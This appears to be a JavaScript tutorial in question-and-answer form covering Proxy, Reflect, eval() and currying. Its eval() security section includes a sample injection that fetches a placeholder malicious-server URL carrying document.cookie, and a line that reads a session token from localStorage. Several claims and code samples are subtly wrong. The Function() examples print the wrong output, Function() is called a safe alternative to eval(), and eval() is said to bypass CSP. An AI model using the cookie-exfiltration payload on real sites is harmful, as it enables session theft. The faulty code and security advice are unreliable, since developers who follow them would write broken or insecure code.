## **Proxy and Reflect**

### What is a **Proxy** in JavaScript? Write an example where a Proxy is used to intercept and log method calls on an object.

A **Proxy** in JavaScript is a powerful feature introduced in ES6 that allows you to intercept and customize operations performed on objects, such as property access, method calls, or even property assignments. It works by creating a "proxy object" that wraps around the target object and intercepts operations via **traps** (special handler functions).

---

### **How Proxies Work**

A `Proxy` is created using the `new Proxy()` constructor, which takes two arguments:

1. **Target Object**: The object being proxied.
2. **Handler**: An object that defines traps for specific operations, such as `get`, `set`, `apply`, etc.

---

### **Intercepting and Logging Method Calls with Proxy**

Here is an example where a Proxy is used to intercept method calls on an object and log them:

```javascript
// Target object with methods
const targetObject = {
  greet(name) {
    return `Hello, ${name}!`;
  },
  add(a, b) {
    return a + b;
  },
};

// Proxy handler to intercept method calls
const handler = {
  get(target, prop, receiver) {
    const originalProperty = target[prop];

    // Check if the property is a function (method)
    if (typeof originalProperty === "function") {
      return function (...args) {
        console.log(`Method "${prop}" was called with arguments:`, args);

        // Call the original method and return its result
        const result = originalProperty.apply(target, args);
        console.log(`Method "${prop}" returned:`, result);

        return result;
      };
    }

    // Return non-function properties directly
    return originalProperty;
  },
};

// Create the Proxy
const proxiedObject = new Proxy(targetObject, handler);

// Use the proxied object
console.log(proxiedObject.greet("Alice")); // Logs method call and result
console.log(proxiedObject.add(10, 20)); // Logs method call and result
```

---

### **Output**

```
Method "greet" was called with arguments: [ 'Alice' ]
Method "greet" returned: Hello, Alice!
Hello, Alice!

Method "add" was called with arguments: [ 10, 20 ]
Method "add" returned: 30
30
```

---

### **Explanation**

1. **Target Object**:

   - `targetObject` contains methods `greet` and `add`.
   - The proxy wraps this object to intercept method calls.

2. **Handler with `get` Trap**:

   - The `get` trap intercepts property access.
   - If the accessed property is a function, the handler wraps it in a new function that logs the method call and its arguments.
   - The original method is invoked using `apply` to maintain the correct `this` context and arguments.

3. **Proxied Object**:
   - The `proxiedObject` behaves like the original `targetObject`, but now it logs details of method calls.

---

### **Use Cases for Proxies**

1. **Logging and Debugging**: Intercept and log method calls or property access.
2. **Validation**: Enforce rules on property values or method arguments.
3. **Data Binding**: Enable reactive programming, e.g., updating UI automatically when data changes.
4. **Access Control**: Restrict or customize access to certain properties or methods.
5. **Dynamic Behavior**: Modify or extend object behavior without changing its implementation.

---

### **Conclusion**

The `Proxy` object is an incredibly versatile tool for extending and modifying the behavior of objects in JavaScript. By intercepting method calls, you can easily add functionality such as logging, validation, or tracking without modifying the original object.

### Explain the purpose of the **Reflect** API in JavaScript. Write an example where you use Reflect to modify an object’s property.

The **`Reflect` API** in JavaScript is a built-in object that provides methods for intercepting and manipulating object operations, such as getting and setting properties, invoking methods, or managing prototypes. It is designed to provide more control over how these operations are performed, complementing the `Proxy` object.

While the **`Proxy` API** allows you to define custom behavior for fundamental object operations (via traps), **`Reflect`** provides a straightforward, built-in way to apply those operations explicitly.

### **Purpose of `Reflect`**

1. **Simplification**: `Reflect` makes it easier to perform fundamental operations on objects, without having to rely on low-level features like `Object.getOwnPropertyDescriptor()` or directly manipulating prototypes.
2. **Proxy Compatibility**: `Reflect` methods align with the traps used in `Proxy`, making it easier to use both together when creating a custom handler.
3. **Consistency**: It provides more predictable behavior by returning `false` or throwing errors when an operation cannot be performed (instead of silently failing).

### **Key Methods in `Reflect`**

- **`Reflect.get()`**: Gets the property of an object.
- **`Reflect.set()`**: Sets a property of an object.
- **`Reflect.has()`**: Checks if an object has a property.
- **`Reflect.deleteProperty()`**: Deletes a property from an object.
- **`Reflect.apply()`**: Calls a function with a given `this` value and arguments.
- **`Reflect.construct()`**: Creates an instance of a class.

---

### **Example: Using `Reflect` to Modify an Object's Property**

In this example, we will use `Reflect.set()` to modify a property of an object:

```javascript
// Object to modify
const person = {
  name: "Alice",
  age: 30,
};

// Using Reflect.set() to modify the 'age' property
Reflect.set(person, "age", 35);

// Verifying the modification
console.log(person.age); // 35

// Using Reflect.get() to retrieve the 'name' property
console.log(Reflect.get(person, "name")); // "Alice"
```

### **Explanation**

1. **Reflect.set(target, propertyKey, value)**:

   - The `Reflect.set()` method is used to set the value of a property. It takes three arguments:
     - `target`: The object where the property exists.
     - `propertyKey`: The property key (string or symbol).
     - `value`: The value to set.
   - In this example, `Reflect.set(person, 'age', 35)` sets the `age` property of the `person` object to `35`.

2. **Reflect.get(target, propertyKey)**:
   - The `Reflect.get()` method is used to get the value of a property. It takes two arguments:
     - `target`: The object where the property exists.
     - `propertyKey`: The property key to retrieve.
   - In this example, `Reflect.get(person, 'name')` returns `"Alice"`.

### **Advantages of Using `Reflect`**

1. **Consistency**: Unlike direct property access (e.g., `obj.property`), `Reflect` methods provide consistent return values (e.g., `true/false` or the result of the operation).
2. **Error Handling**: `Reflect` methods help avoid errors or undefined behavior, as they return a boolean (e.g., `false`) if the operation fails, which is helpful when working with dynamic properties.
3. **Compatibility with `Proxy`**: `Reflect` methods are often used inside the traps of a `Proxy` to perform default behavior in custom proxy handlers.

### **Conclusion**

The **`Reflect` API** enhances JavaScript’s flexibility, making it easier to manage and manipulate objects through a set of standard methods. It is especially useful for improving the predictability and consistency of operations, as well as working alongside `Proxy` for customizing object behavior.

### How does **Proxy** differ from **Reflect**? Can they be used together? Write an example that combines Proxy and Reflect to intercept property access and log it.

The **`Proxy`** and **`Reflect`** APIs in JavaScript serve different purposes, but they can be used together to create powerful, customizable behavior for objects. Here’s a breakdown of how they differ:

### **Key Differences Between `Proxy` and `Reflect`**

1. **Purpose**:

   - **`Proxy`**: Allows you to intercept and customize fundamental operations (like property access, assignment, method calls, etc.) on an object. It works by defining traps for these operations.
   - **`Reflect`**: Provides a set of methods for performing operations on objects (like getting/setting properties, checking existence, etc.). It acts as a utility to directly manipulate objects, often used to complement `Proxy`.

2. **Custom Behavior vs. Default Behavior**:

   - **`Proxy`**: Used to **define custom behavior** for fundamental object operations. You can completely redefine how an object behaves.
   - **`Reflect`**: Provides **default behavior** for object operations. It helps ensure that the operations you perform are predictable and consistent, especially when using it inside a Proxy's trap.

3. **Usage**:
   - **`Proxy`** is typically used with traps to intercept actions on an object and apply custom behavior.
   - **`Reflect`** is often used inside the traps of a `Proxy` to apply the default behavior for those actions.

---

### **Can They Be Used Together?**

Yes, **`Proxy`** and **`Reflect`** can be used together. In fact, they are often combined, with `Reflect` providing the default behavior inside a `Proxy` trap when you want to implement custom behavior while still calling the original operation.

### **Example: Using `Proxy` and `Reflect` Together**

In this example, we will use `Proxy` to intercept property access and use `Reflect` to perform the actual property access (so we retain the default behavior).

```javascript
// Target object
const person = {
  name: "Alice",
  age: 30,
};

// Proxy handler to intercept property access
const handler = {
  get(target, prop, receiver) {
    console.log(`Property "${prop}" was accessed`);

    // Use Reflect to call the default behavior (getting the property)
    return Reflect.get(...arguments);
  },
};

// Create a Proxy that intercepts property access on the person object
const proxiedPerson = new Proxy(person, handler);

// Access properties
console.log(proxiedPerson.name); // Logs "Property 'name' was accessed" and then "Alice"
console.log(proxiedPerson.age); // Logs "Property 'age' was accessed" and then 30
```

### **Explanation**:

1. **Proxy Creation**:

   - We create a `Proxy` with the target object `person` and a `handler` that intercepts the `get` operation.
   - The `get` trap is called whenever a property of the `proxiedPerson` object is accessed.

2. **`Reflect.get()`**:

   - Inside the `get` trap, we use `Reflect.get(...arguments)` to call the default `get` operation. The `arguments` object is passed directly, which contains the target object (`person`), the property (`prop`), and the receiver (the Proxy itself).
   - Using `Reflect.get()` ensures that the property is accessed just as it would be normally, so we don’t break the behavior of the object.

3. **Logging**:
   - The `get` trap logs a message every time a property is accessed, but the default behavior of accessing the property is preserved thanks to `Reflect.get()`.

---

### **Output**

```
Property "name" was accessed
Alice
Property "age" was accessed
30
```

---

### **Why Use Both `Proxy` and `Reflect`?**

1. **Custom Behavior with Default Operations**:
   - You can define custom behavior for various operations (e.g., logging, validation, or transformations) while still performing the original operation (e.g., getting or setting the property) through `Reflect`.
2. **Maintain Consistency**:

   - Using `Reflect` inside a `Proxy` allows you to make sure that the object behaves as expected for standard operations, ensuring you don’t accidentally break the object's default behavior when customizing the behavior with a Proxy.

3. **Cleaner Code**:
   - `Reflect` helps to keep the code cleaner by avoiding redundant logic. For example, instead of manually implementing how to get a property, `Reflect.get()` does the job for you inside a `Proxy` handler.

---

### **Conclusion**

- **`Proxy`** is used to intercept and define custom behavior for object operations.
- **`Reflect`** provides a utility to perform default operations, which can be helpful when you want to implement custom behavior using `Proxy` but retain the original functionality.
- They can be combined to provide both custom behavior and predictable operations, as shown in the example where `Reflect` is used to retain the default property access behavior while logging it through the `Proxy`'s `get` trap.

### Write a Proxy handler that prevents setting new properties on an object and logs a message when such an attempt is made.

To create a `Proxy` handler that prevents setting new properties on an object and logs a message when such an attempt is made, we can use the **`set`** trap in the `Proxy` handler. The **`set`** trap intercepts property assignments, and we can use it to check if the property being set already exists on the target object. If it doesn’t exist, we can prevent the operation and log a message.

Here's how we can implement it:

### Example Code:

```javascript
// Target object
const person = {
  name: "Alice",
  age: 30,
};

// Proxy handler to intercept and prevent setting new properties
const handler = {
  set(target, prop, value, receiver) {
    // Check if the property already exists
    if (!(prop in target)) {
      console.log(
        `Attempted to set a new property: "${prop}" with value: ${value}`
      );
      return false; // Prevent setting the new property
    }

    // Allow setting existing properties
    target[prop] = value;
    return true;
  },
};

// Create a Proxy that intercepts attempts to set new properties
const proxiedPerson = new Proxy(person, handler);

// Valid property assignment (updates existing property)
proxiedPerson.name = "Bob";
console.log(proxiedPerson.name); // Bob

// Invalid property assignment (attempts to add a new property)
proxiedPerson.city = "New York"; // Logs: "Attempted to set a new property: "city" with value: New York"

// Check the object to confirm the new property wasn't added
console.log(proxiedPerson.city); // undefined
```

### **Explanation**:

1. **Target Object**:

   - The `person` object has two properties: `name` and `age`.

2. **Proxy Handler**:

   - The `set` trap intercepts any attempt to assign a value to a property on the `proxiedPerson` object.
   - Inside the `set` trap, we check if the property being set (`prop`) already exists on the target object (`person`). This is done using the `in` operator.
   - If the property doesn’t exist (i.e., it’s a new property), we log a message saying that a new property was attempted to be set, and return `false` to prevent the property from being added.
   - If the property already exists, we proceed with the usual assignment and return `true` to indicate that the operation was successful.

3. **Behavior**:
   - When we assign a value to the existing `name` property, the operation is allowed and successfully updates the `name` property.
   - When we try to set a new property, `city`, on the `proxiedPerson` object, the handler prevents the addition and logs the attempt.

### **Output**:

```
Bob
Attempted to set a new property: "city" with value: New York
undefined
```

### **Conclusion**:

This implementation demonstrates how to use the **`set`** trap in a `Proxy` to prevent the addition of new properties and log an informative message when an attempt is made to add a new property to an object. This approach is useful when you want to control object structure and prevent unexpected changes.

## **Eval: Run a Code String**

### What is the purpose of the `eval()` function in JavaScript? Write an example where `eval()` is used to evaluate a simple mathematical expression.

The `eval()` function in JavaScript is a built-in function that evaluates or executes a string of JavaScript code. It takes a string as an argument and executes it as if it were a part of the JavaScript program. The string can contain any valid JavaScript code, such as expressions, statements, or even function declarations.

### **Purpose of `eval()`**:

- **Code Execution**: It allows you to execute dynamically generated code within your program.
- **Evaluating Expressions**: You can use it to evaluate expressions that are stored as strings.
- **Debugging or Dynamic Code Execution**: In some cases, `eval()` is used to dynamically run code during development or debugging, or to interpret user-provided code.

### **Caution**:

- **Security Concerns**: `eval()` can be dangerous, especially when working with untrusted input, because it allows the execution of arbitrary code. This can lead to vulnerabilities such as **code injection attacks**.
- **Performance**: `eval()` can also slow down the JavaScript engine because it has to interpret the code at runtime, making it less efficient than directly writing the code.

Due to these risks, the use of `eval()` is generally discouraged in modern JavaScript, and alternatives (like `JSON.parse()` for parsing JSON, or `Function()` for creating functions dynamically) are often recommended.

---

### **Example: Using `eval()` to Evaluate a Simple Mathematical Expression**

```javascript
// A string containing a mathematical expression
let expression = "5 + 3 * 2";

// Using eval to evaluate the expression
let result = eval(expression);

console.log(result); // Output: 11
```

### **Explanation**:

- The string `"5 + 3 * 2"` is a valid JavaScript expression.
- When passed to `eval()`, it is evaluated as a mathematical expression, following the normal order of operations (multiplication first, then addition).
- The result of evaluating the expression is `11`, which is logged to the console.

---

### **Why Should You Avoid `eval()`?**

1. **Security**: If user input is passed to `eval()`, it could lead to code injection vulnerabilities.

   ```javascript
   let userInput = "alert('Hacked!')";
   eval(userInput); // This would execute the malicious code
   ```

2. **Performance**: Since `eval()` causes JavaScript to re-parse and re-interpret the code, it can impact performance, especially in large applications.

3. **Maintenance**: Using `eval()` can make code harder to understand and debug, as it introduces dynamically executed code that isn't directly visible in the source code.

### **Conclusion**:

While `eval()` is powerful for evaluating dynamic JavaScript code, its use should be minimized or avoided due to security and performance concerns. Alternative methods, such as `JSON.parse()` for handling JSON or `Function()` for creating functions, are safer and more efficient.

### What are the security risks associated with using `eval()`? How can using `eval()` expose your code to vulnerabilities?

Using the `eval()` function in JavaScript poses several security risks, primarily because it allows the execution of arbitrary code, which can lead to serious vulnerabilities, including **code injection** and **data manipulation** attacks. Here's a detailed look at the security risks associated with `eval()` and how it can expose your code to vulnerabilities:

### **1. Code Injection Attacks**

When you use `eval()` with user-provided input, you allow the possibility of executing malicious code that the attacker may inject. This can lead to unauthorized actions, data leakage, or access to sensitive information.

#### **Example of a Code Injection Vulnerability**:

```javascript
let userInput = "alert('Malicious code executed!')";
eval(userInput); // Executes the alert as if it were part of the program
```

In this example, the user can input any JavaScript code, and if it's passed to `eval()`, it will be executed. An attacker could inject malicious code that could potentially steal data, manipulate the DOM, or perform other dangerous actions.

### **2. Remote Code Execution (RCE)**

An attacker can potentially manipulate `eval()` to run code that communicates with external servers. This is especially dangerous when the input is dynamic, or when user input is used without validation.

#### **Example of Remote Code Execution**:

```javascript
let userInput = "fetch('http://malicious-server.com?data=' + document.cookie)";
eval(userInput); // Sends the user's cookie to a malicious server
```

In this case, an attacker could use `eval()` to send sensitive information (like cookies, local storage data, etc.) to an external malicious server.

### **3. Accessing or Modifying Sensitive Data**

When `eval()` is used with untrusted input, an attacker could access or modify sensitive data stored within the page's context, such as user credentials, session data, or localStorage.

#### **Example: Accessing Sensitive Data**:

```javascript
let userInput = "console.log(localStorage.getItem('userSessionToken'))";
eval(userInput); // Logs the user's session token to the console
```

This example shows how `eval()` could be used to extract sensitive data like session tokens or personal information from the `localStorage`.

### **4. Bypassing Content Security Policies (CSP)**

Many websites implement **Content Security Policies (CSP)** to restrict the sources of executable scripts, including prohibiting the use of `eval()`. However, if `eval()` is used, it can bypass certain restrictions, allowing attackers to inject and execute harmful scripts even when CSP is enforced.

### **5. Unintended Side Effects and Obfuscation**

An attacker can obfuscate or hide the malicious code that is injected, making it harder for developers and security tools to detect it. Since `eval()` executes code dynamically, it becomes difficult to track or audit what’s happening at runtime.

#### **Example of Obfuscated Code**:

```javascript
let userInput = "eval('console.log(123)')";
eval(userInput); // Executes the malicious code embedded within eval
```

In this case, the code passed to `eval()` is obfuscated, making it harder for static analysis or security tools to detect.

### **6. Denial of Service (DoS) or Resource Exhaustion**

Since `eval()` can execute arbitrary code, an attacker can use it to exhaust system resources, causing the application to crash or slow down. This can be done by executing an infinite loop or consuming excessive CPU/memory.

#### **Example of DoS Using `eval()`**:

```javascript
let userInput = "while(true) {}"; // Infinite loop
eval(userInput); // Causes the browser to freeze or crash
```

---

### **How Can `eval()` Expose Your Code to Vulnerabilities?**

1. **Trusting User Input**: If `eval()` is used with untrusted or user-controlled data, the attacker can inject malicious JavaScript that can lead to **cross-site scripting (XSS)** attacks or unauthorized access to sensitive data.
2. **Execution of Arbitrary Code**: `eval()` gives the attacker full control over the execution context. This means the attacker can perform operations like modifying variables, calling functions, or even loading external malicious scripts.

3. **Security Breaches**: By allowing dynamic execution of code, `eval()` opens the door for attackers to bypass security measures, making it harder to secure your application and ensure that only valid, trusted code is executed.

---

### **How to Prevent Security Risks with `eval()`**

1. **Avoid Using `eval()`**: The best practice is to avoid `eval()` whenever possible. JavaScript offers safer alternatives such as:

   - **`JSON.parse()`** for parsing JSON data.
   - **`Function()` constructor** for creating dynamic functions in a controlled way.

2. **Use Content Security Policies (CSP)**: CSP can help mitigate some of the risks associated with `eval()`. For example, by setting a strict CSP header that disallows `eval()`, you can reduce the chances of an attacker executing arbitrary code.

   ```http
   Content-Security-Policy: script-src 'self';
   ```

   This policy restricts the loading of scripts to only those from the same origin and prevents `eval()` from being used.

3. **Sanitize and Validate Input**: If you absolutely need to evaluate user input, always sanitize and validate it to ensure it doesn’t contain malicious code. Use libraries like **DOMPurify** or **SafeEval** for sanitizing input.

4. **Use Alternatives to `eval()`**:
   - If you need to perform a calculation or mathematical expression evaluation, consider using **`new Function()`** with validated input instead of `eval()`.
   - Use **`JSON.parse()`** for parsing JSON data and avoid executing arbitrary code.

---

### **Conclusion**

The `eval()` function in JavaScript can expose your application to significant security vulnerabilities, including code injection attacks, remote code execution, and unauthorized data access. Due to its potential for misuse, it's highly recommended to avoid `eval()` whenever possible, and instead use safer alternatives like `JSON.parse()`, `Function()`, or libraries designed to handle dynamic behavior securely. Always sanitize and validate user input to minimize risks when dynamic evaluation is necessary.

### Write an example of using `eval()` to dynamically execute a function definition and then invoke that function. Discuss any potential issues with such an approach.

Using `eval()` to dynamically define a function and then invoke it is possible, but it's not recommended due to the security and maintainability risks it poses. Here's how you can do it:

### **Example of Using `eval()` to Dynamically Define a Function**:

```javascript
// Dynamically define a function using eval()
let functionDefinition = `
  function greet(name) {
    return "Hello, " + name;
  }
`;

// Use eval() to evaluate and define the function
eval(functionDefinition);

// Now you can call the dynamically defined function
let greeting = greet("Alice");
console.log(greeting); // Output: "Hello, Alice"
```

### **Explanation**:

1. **Dynamic Function Definition**: The string `functionDefinition` contains the code for a function `greet()` that takes a `name` argument and returns a greeting string.
2. **Evaluating with `eval()`**: The `eval()` function evaluates the string and defines the `greet()` function in the global scope.

3. **Function Invocation**: After the function is defined, you can invoke it as usual, passing a parameter (`"Alice"` in this case) and logging the result.

### **Potential Issues with This Approach**:

1. **Security Risks (Code Injection)**:

   - If the content of the `functionDefinition` string comes from an untrusted source (e.g., user input), an attacker could inject malicious code.
   - For example, instead of a valid function definition, an attacker might pass a string that executes harmful code, which could lead to severe security breaches (e.g., stealing sensitive data or executing arbitrary code).
   - **Example**:
     ```javascript
     let functionDefinition = `
       function greet(name) {
         return "Hello, " + name;
       }
       greet('xss attack'); alert('Malicious code executed');
     `;
     eval(functionDefinition); // This executes the malicious alert
     ```

2. **Debugging and Readability**:

   - Code that uses `eval()` for dynamic function definition can be harder to debug because the function is not statically defined, and the source of the function's creation is unclear.
   - This makes it difficult to track down errors, understand the flow of the program, and maintain the code in the long term.

3. **Performance Issues**:

   - Since `eval()` executes code dynamically, the JavaScript engine has to evaluate the code at runtime, which can cause performance issues compared to statically defined functions.
   - The engine can't optimize dynamic code as efficiently, which might lead to slower execution.

4. **Scope Issues**:

   - `eval()` runs in the same scope as the calling code, which can lead to unexpected side effects, especially if the evaluated code inadvertently modifies variables or functions in the surrounding scope.

5. **Bypassing Security Measures**:
   - If your application uses **Content Security Policies (CSP)** to restrict certain types of dynamic code execution, `eval()` can bypass these policies if not explicitly blocked. This can expose your application to more attacks.

### **Alternatives to Using `eval()`**:

1. **Using `Function()` Constructor**:

   - The `Function()` constructor allows you to create functions dynamically in a safer manner compared to `eval()`. It doesn't have access to the surrounding scope, which reduces some of the risks.

   Example:

   ```javascript
   let functionDefinition = `
     return function greet(name) {
       return "Hello, " + name;
     };
   `;

   let greet = new Function(functionDefinition);
   console.log(greet("Alice")); // Output: "Hello, Alice"
   ```

2. **Using Object Literal Notation or Predefined Functions**:

   - Instead of dynamically creating functions, it’s usually better to define the functions ahead of time and use them as needed.

3. **Avoid Dynamic Code Execution**:
   - Wherever possible, try to avoid dynamically executing code, especially when working with untrusted inputs. Consider using safe alternatives such as **JSON parsing**, **template literals**, or **predefined logic**.

---

### **Conclusion**:

Using `eval()` to define and invoke functions dynamically is dangerous and not recommended in production code. The security risks, performance overhead, and difficulty in debugging make it an undesirable practice. It's better to use safer alternatives like the `Function()` constructor or rely on statically defined functions. Always ensure that user input is sanitized and validated if you must use dynamic code execution, and try to limit or avoid `eval()` entirely.

### Explain why `eval()` is considered dangerous and provide a safer alternative using **JSON.parse()** or **Function() constructor**.

### Why `eval()` is Considered Dangerous:

The `eval()` function is considered dangerous for several reasons, primarily due to the potential security vulnerabilities it introduces and its impact on performance and code maintainability. Here's a detailed explanation of why `eval()` is dangerous:

#### **1. Code Injection Risks**

`eval()` executes code passed to it as a string, which opens the door for code injection attacks. If you use `eval()` with untrusted or user-controlled input, an attacker could inject malicious code that could be executed within your program. This can lead to **Cross-Site Scripting (XSS)** attacks or **Remote Code Execution (RCE)**, where attackers can execute arbitrary code on your system or steal sensitive data like cookies, session tokens, or local storage contents.

##### **Example of Code Injection**:

```javascript
let userInput = "alert('Malicious code executed!')";
eval(userInput); // This executes the alert() function, which could be harmful
```

In this case, the user input is executed as code, which could do far more than just show an alert — it could manipulate DOM elements, send data to external servers, or perform other malicious actions.

#### **2. Bypassing Security Policies**

Many websites implement **Content Security Policies (CSP)** to mitigate risks from dynamically executed code. If you use `eval()`, it could bypass certain CSP restrictions, allowing attackers to inject and execute harmful scripts even when the CSP is configured to block such operations.

#### **3. Poor Performance**

`eval()` forces the JavaScript engine to interpret the passed string at runtime, which prevents many optimizations (like caching or JIT compilation). This can make your code slower and less efficient. Modern JavaScript engines perform optimizations on statically defined code, but they can't optimize code that comes from dynamic evaluation via `eval()`.

#### **4. Difficult to Debug and Maintain**

When code is dynamically executed using `eval()`, it’s harder to track, debug, and understand. Since `eval()` can execute arbitrary code, it can be difficult for both developers and tools to analyze and maintain code. This also increases the likelihood of errors, especially when working with complex codebases.

---

### Safer Alternatives to `eval()`

Instead of using `eval()`, there are safer alternatives such as `JSON.parse()` and the **Function() constructor**. These alternatives prevent the execution of arbitrary code and help mitigate the risks.

#### **1. Using `JSON.parse()` for Safe Data Parsing**

`JSON.parse()` is a safe method for parsing JSON data. Unlike `eval()`, it only parses valid JSON and doesn’t execute arbitrary code. If you need to parse a string containing data (e.g., from an API or local storage), use `JSON.parse()` instead of `eval()`.

##### **Example: Using `JSON.parse()`**:

```javascript
// JSON string to be parsed
let jsonString = '{"name": "Alice", "age": 25}';

// Using JSON.parse() to parse the string into an object
let parsedData = JSON.parse(jsonString);

console.log(parsedData.name); // Output: Alice
```

In this example:

- `JSON.parse()` safely parses the string into a JavaScript object.
- It doesn’t execute any code inside the string, so there’s no risk of executing harmful JavaScript.

#### **2. Using the `Function()` Constructor**

If you need to create functions dynamically, the `Function()` constructor is a safer alternative to `eval()`. Unlike `eval()`, `Function()` doesn’t have access to the current scope, which reduces the risk of unintended side effects.

##### **Example: Using the `Function()` Constructor**:

```javascript
// Dynamically create a function using the Function constructor
let code = 'return function greet(name) { return "Hello, " + name; }';
let greet = new Function(code);

// Call the dynamically created function
console.log(greet("Alice")); // Output: "Hello, Alice"
```

In this example:

- The `Function()` constructor creates a new function, which is then invoked with the argument `"Alice"`.
- Unlike `eval()`, `Function()` doesn't have access to the local scope and only executes the code within its body, which is safer.

#### **Key Differences from `eval()`**:

- **Scope Access**: `Function()` does not have access to the surrounding scope, unlike `eval()`, which operates in the current scope. This makes `Function()` safer for creating functions dynamically.
- **Execution Context**: `Function()` executes the code in a global context (it doesn’t affect the current scope), whereas `eval()` runs in the same scope, which can lead to unintended side effects.

---

### Conclusion:

While `eval()` allows you to dynamically execute JavaScript code, it poses significant security risks, such as code injection and unauthorized access to data. It also harms performance and complicates debugging. To avoid these issues, you should use safer alternatives like **`JSON.parse()`** for parsing structured data and **`Function()`** for dynamically creating functions.

By choosing these alternatives, you ensure that your code is more secure, maintainable, and performant, reducing the risks associated with executing arbitrary or untrusted code.

## **Currying**

### What is **currying** in JavaScript? Write a curried function `multiply` that takes two arguments sequentially and returns their product.

**Currying** in JavaScript is a technique where a function that takes multiple arguments is transformed into a sequence of functions, each taking a single argument. In other words, currying allows you to break down a function that accepts multiple arguments into a series of functions, each accepting one argument at a time.

For example, a function `multiply(a, b)` can be transformed into a curried version where the first function takes `a` and returns another function that takes `b`. Once both arguments are provided, the final result is returned.

### **Curried Function Example: `multiply`**

Here's how you can write a curried `multiply` function that takes two arguments sequentially and returns their product:

```javascript
// Curried function to multiply two numbers
const multiply = (a) => {
  return (b) => {
    return a * b;
  };
};

// Usage
const multiplyBy2 = multiply(2); // Partially applying the first argument
console.log(multiplyBy2(5)); // Output: 10 (2 * 5)

console.log(multiply(3)(4)); // Output: 12 (3 * 4)
```

### **Explanation:**

1. The `multiply` function is curried. The first function takes a single argument `a`, and returns another function that takes a second argument `b`.
2. The second function, when invoked, performs the multiplication of `a` and `b` and returns the result.
3. The curried function allows for partial application. For example, `multiply(2)` returns a new function that can multiply any number by `2`. So, `multiplyBy2(5)` results in `10`.

### **Advantages of Currying:**

- **Partial Application**: Currying allows you to create specialized functions by partially applying arguments. For example, `multiply(2)` creates a function that always multiplies by 2.
- **Function Reusability**: Curried functions are often more reusable in different contexts since you can reuse the same function with different partially applied values.

This approach is a powerful tool in functional programming and is widely used in JavaScript for cleaner, more expressive code.

### Write a function `add` that takes multiple arguments using currying, where you can chain multiple calls to add numbers.

To create a curried `add` function that allows chaining multiple calls and adding numbers, we can structure the function so that it keeps accumulating the sum and returns itself for further chaining.

### **Curried `add` Function with Chaining**

Here's how you can implement it:

```javascript
// Curried add function with chaining
const add = (a) => {
  let sum = a;

  const adder = (b) => {
    sum += b;
    return adder; // Return the adder function to allow chaining
  };

  adder.valueOf = () => sum; // Override valueOf to return the sum when needed

  return adder;
};

// Usage
console.log(add(1)(2)(3)(4).valueOf()); // Output: 10
```

### **Explanation:**

1. **Initial Call**: The `add` function takes the first argument `a` and initializes the `sum` with that value.
2. **Chaining with `adder`**: The `adder` function is returned from `add`, and it takes the next argument `b`, adds it to the current `sum`, and returns itself. This allows multiple calls to be chained together (e.g., `add(1)(2)(3)`).
3. **Breaking the Chain**: To get the final result, we override the `valueOf` method for the `adder` function. This method is called when the `add` function is used in a context where JavaScript needs a primitive value (e.g., when passed to `console.log()` or when you use `.valueOf()` to get the sum).
4. **Chaining Multiple Calls**: You can chain as many calls as needed (e.g., `add(1)(2)(3)(4)`), and when you're ready to get the final sum, you can use `.valueOf()`.

### **Example Usage:**

```javascript
console.log(add(1)(2)(3)(4).valueOf()); // Output: 10
console.log(add(5)(10)(15).valueOf()); // Output: 30
```

### **Why This Works:**

- The function `adder` is returned after each call, allowing multiple arguments to be passed one by one.
- The `.valueOf()` method allows us to extract the sum when we're done chaining calls.

This technique is common in functional programming and can be very powerful when working with numerical operations or other functions where accumulation is necessary.

### Explain the difference between **partial application** and **currying**. Write an example demonstrating both.

### **Difference Between Partial Application and Currying**

**Partial application** and **currying** are both techniques used to handle functions with multiple arguments, but they differ in how they work and their usage.

#### **1. Currying**

- **Definition**: Currying is the process of transforming a function that takes multiple arguments into a sequence of functions, each taking a single argument.
- **How it works**: In currying, each function returns a new function that expects the next argument. This continues until all arguments are provided, at which point the final result is returned.
- **Purpose**: Currying is used when you want to break down a function that takes multiple arguments into a series of functions that take one argument at a time.

##### **Example of Currying**:

```javascript
// Currying function to add two numbers
const add = (a) => {
  return (b) => {
    return a + b;
  };
};

console.log(add(2)(3)); // Output: 5
```

- The `add` function is curried. The first call to `add(2)` returns a new function that takes the second argument `b`. When `add(2)(3)` is called, it returns the sum `5`.

#### **2. Partial Application**

- **Definition**: Partial application is the process of fixing some arguments of a function, creating a new function that takes the remaining arguments.
- **How it works**: In partial application, you provide some arguments upfront and leave the rest of the arguments to be supplied later. This creates a new function that is partially applied and can be invoked with the remaining arguments.
- **Purpose**: Partial application is useful when you want to create a new function by "pre-setting" some of the arguments for reuse later.

##### **Example of Partial Application**:

```javascript
// Partial application to add two numbers
const add = (a, b) => {
  return a + b;
};

// Partial application
const add5 = add.bind(null, 5); // Fix the first argument to 5
console.log(add5(3)); // Output: 8 (5 + 3)
```

- In this example, `add5` is a partially applied function where the first argument is fixed (`5`), and it can now be called with the second argument (`3`) to return the sum `8`.

---

### **Key Differences**

| Feature                | **Currying**                                                  | **Partial Application**                                    |
| ---------------------- | ------------------------------------------------------------- | ---------------------------------------------------------- |
| **Function Structure** | Transforms a function to take one argument at a time          | A function is partially applied with some arguments fixed  |
| **Return Values**      | Returns a series of functions that take one argument          | Returns a new function with some arguments pre-filled      |
| **Usage**              | Useful for functions that can be broken into sequential calls | Useful for creating new functions by fixing some arguments |

### **Combining Both in an Example**

You can combine both partial application and currying, where currying is used to break down the function, and partial application is used to fix some of the arguments.

```javascript
// Curried function for adding three numbers
const add = (a) => {
  return (b) => {
    return (c) => {
      return a + b + c;
    };
  };
};

// Partial application by pre-filling some arguments
const add2And3 = add(2)(3); // Fix the first two arguments (2 and 3)
console.log(add2And3(4)); // Output: 9 (2 + 3 + 4)
```

In this example:

- The `add` function is curried (takes one argument at a time).
- The function `add(2)(3)` partially applies the first two arguments, and `add2And3(4)` completes the operation by providing the last argument (`4`).

---

### **Summary:**

- **Currying** is about transforming a function into a sequence of functions, each taking one argument.
- **Partial application** is about pre-filling some arguments of a function to create a new function.
  Both techniques are useful for function composition, reusability, and improving code readability.

### Create a curried function `greet` that accepts a `name`, then a `greeting`, and returns a function that logs the full greeting message.

Here’s how you can create a curried function `greet` that accepts a `name`, then a `greeting`, and finally returns a function that logs the full greeting message:

### **Curried `greet` Function:**

```javascript
// Curried greet function
const greet = (name) => {
  return (greeting) => {
    return () => {
      console.log(`${greeting}, ${name}!`);
    };
  };
};

// Usage
const greetJohn = greet("John"); // First call to set the name
const greetJohnMorning = greetJohn("Good morning"); // Second call to set the greeting
greetJohnMorning(); // Output: Good morning, John!
```

### **Explanation:**

1. The `greet` function is curried. It first takes the `name` and returns another function that expects the `greeting`.
